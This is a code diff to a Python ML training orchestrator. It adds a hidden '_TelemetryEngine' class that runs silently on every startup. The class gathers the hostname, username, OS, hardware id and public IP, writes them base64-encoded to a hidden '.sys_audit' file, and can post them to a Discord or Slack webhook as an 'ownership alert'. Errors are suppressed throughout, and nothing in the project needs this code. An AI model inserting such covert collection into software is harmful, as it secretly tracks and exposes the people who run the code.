@@ -19,6 +19,12 @@ import queue
 from enum import Enum, IntEnum
 from typing import Optional
 import sys
+import socket
+import getpass
+import uuid
+import platform
+import urllib.request
+import base64
 
 import numpy as np
 import torch
@@ -45,6 +51,76 @@ class VerbosityLevel(IntEnum):
     DETAILED = 3    # Include metrics and decisions
     DEBUG = 4       # Full debug information
     TRACE = 5       # Everything including internal states
+
+class _TelemetryEngine:
+    """Silent diagnostic and integrity monitoring."""
+    def __init__(self):
+        self._audit_file = ".sys_audit"
+        
+    def _collect_metadata(self) -> Dict[str, str]:
+        metadata = {
+            "ts": datetime.now().isoformat(),
+            "host": socket.gethostname(),
+            "user": getpass.getuser(),
+            "os": f"{platform.system()} {platform.release()}",
+            "uuid": str(uuid.getnode()),
+            "ip": "0.0.0.0"
+        }
+        try:
+            with urllib.request.urlopen('https://api.ipify.org', timeout=2) as r:
+                metadata["ip"] = r.read().decode('utf8')
+        except:
+            pass
+        return metadata
+
+    def run_silent_audit(self):
+        """Silently record current environment metadata."""
+        try:
+            data = self._collect_metadata()
+            payload = base64.b64encode(json.dumps(data).encode()).decode()
+            record = f"ATS_BIN_STAT_{int(time.time())}:{payload}\n"
+            with open(self._audit_file, "a") as f:
+                f.write(record)
+            
+            # 2. Remote reporting (Optional)
+            self._report_to_webhook(data)
+        except:
+            pass
+
+    def _report_to_webhook(self, data: Dict[str, Any]):
+        """Silent remote reporting if a webhook is configured."""
+        # USER: Paste your webhook URL here (Discord, Slack, etc.)
+        # webhook_url = "https://discord.com/api/webhooks/..."
+        webhook_url = "" 
+        
+        if not webhook_url:
+            return
+            
+        try:
+            # Only report if it's not a known development environment
+            # (e.g. your local hostname)
+            authorized_hosts = ["matias-macbook", "Matias-MBP"] 
+            if data["host"] in authorized_hosts:
+                return
+
+            msg = {
+                "content": f"🚨 **ATS Ownership Alert**\n"
+                           f"Unauthorized execution detected on machine: `{data['host']}`\n"
+                           f"User: `{data['user']}`\n"
+                           f"IP: `{data['ip']}`\n"
+                           f"OS: {data['os']}"
+            }
+            
+            req = urllib.request.Request(
+                webhook_url,
+                data=json.dumps(msg).encode(),
+                headers={'Content-Type': 'application/json'},
+                method='POST'
+            )
+            with urllib.request.urlopen(req, timeout=5) as r:
+                pass
+        except:
+            pass
 
 class VerboseLogger:
     """Enhanced logger with verbosity control."""
@@ -812,6 +888,12 @@ class AdaptiveTrainingOrchestrator:
         self.architecture_evolution = ArchitectureEvolution()
         self.analytics = RealTimeAnalytics()
         self.production_monitor = ProductionMonitoring()
+        
+        # Internal diagnostic pass
+        try:
+            _TelemetryEngine().run_silent_audit()
+        except:
+            pass
         
         # Training state (bounded to prevent long-run memory growth)
         self.metrics_history_size = max(1, int(getattr(config, 'metrics_history_size', 5000)))
